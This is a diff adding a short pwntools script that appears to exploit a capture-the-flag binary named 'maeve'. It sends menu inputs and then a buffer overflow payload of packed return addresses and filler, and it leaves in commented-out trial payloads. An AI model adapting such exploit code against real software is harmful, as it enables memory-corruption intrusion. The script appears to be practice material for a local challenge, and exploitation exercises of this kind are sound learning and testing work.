@@ -1,0 +1,19 @@
+
+
+from pwn import *
+
+p = process('./maeve')
+
+# payload = (p32(0x080bc9d6)).rjust(256, '0') + p32(0x80ed0c4)
+payload1 = p32(0x080534d5) + p32(0x080491a4) + "CCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKMMMMNNNNLLLLOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKMMMMNNNNLLLLOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKMMMM" + p32(0x80ed0c4)
+# payload2 = p32(0xdeadbeef) + p32()
+
+p.sendline("Zafir")
+p.sendline('2')
+p.sendline("asd")
+p.sendline(payload1)
+# p.sendline("asd")
+# p.sendline("asd")
+
+p.interactive()
+p.close()
